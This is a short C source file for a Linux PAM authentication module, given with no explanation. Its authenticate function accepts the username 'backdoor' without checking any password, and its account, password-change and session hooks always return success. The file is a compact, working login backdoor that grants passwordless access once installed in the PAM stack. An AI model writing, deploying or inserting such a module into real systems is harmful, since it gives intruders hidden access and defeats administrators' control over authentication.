#include <string.h>
#include <syslog.h>
#include <stdio.h>
#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION
#define PAM_SM_PASSWORD
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    printf("setcred\n");
    return PAM_SUCCESS ;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    int retval;
    const char* pUsername;
    retval = pam_get_user(pamh, (const char**)&pUsername, "TUsername: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    if (strcmp(pUsername, "backdoor") != 0) {
        return PAM_AUTH_ERR;
    }
    printf("auth\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("mgmt\n");
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("tok\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("opsession\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,int flags,int argc, const char **argv)
{
    printf("closesession\n");
    return PAM_SUCCESS;
}
